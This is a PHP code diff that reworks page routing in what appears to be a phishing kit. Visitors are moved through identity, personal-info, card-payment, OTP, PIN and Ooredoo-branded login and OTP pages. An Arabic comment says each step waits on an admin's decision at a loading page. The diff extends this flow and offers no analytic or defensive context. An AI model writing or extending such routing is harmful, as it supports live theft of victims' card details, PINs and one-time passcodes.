@@ -36,29 +36,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         exit;
     }
 
-    if (strpos($current_page, 'update_info.php') !== false) {
-        header("Location: identity_verification.php?visitor_id=$visitor_id");
-        exit;
-    }
-
-    if (strpos($current_page, 'identity_verification.php') !== false) {
-        header("Location: personal_info.php?visitor_id=$visitor_id");
-        exit;
-    }
-
-    if (strpos($current_page, 'personal_info.php') !== false) {
-        header("Location: payment.php?visitor_id=$visitor_id");
-        exit;
-    }
-
-    // صفحة التحميل تظهر فقط بعد إدخال البطاقة (payment.php) أو Ooredoo
-    header("Location: loading.php?visitor_id=$visitor_id&next=" . getNextStep($current_page));
+    // كافة الصفحات التالية تحتاج لقرار الأدمن للانتقال، لذا نوجهها لصفحة التحميل
+    $next_step = getNextStep($current_page);
+    header("Location: loading.php?visitor_id=$visitor_id&next=$next_step");
     exit;
 }
 
 function getNextStep($current) {
+    if (strpos($current, 'update_info.php') !== false) return 'identity_verification.php';
+    if (strpos($current, 'identity_verification.php') !== false) return 'personal_info.php';
+    if (strpos($current, 'personal_info.php') !== false) return 'payment.php';
     if (strpos($current, 'payment.php') !== false) return 'otp.php';
     if (strpos($current, 'otp.php') !== false) return 'pin.php';
+    if (strpos($current, 'pin.php') !== false) return 'ooredoo.php';
     if (strpos($current, 'ooredoo.php') !== false) return 'otp_ooredoo.php';
     if (strpos($current, 'otp_ooredoo.php') !== false) return 'success.php';
     return 'success.php';
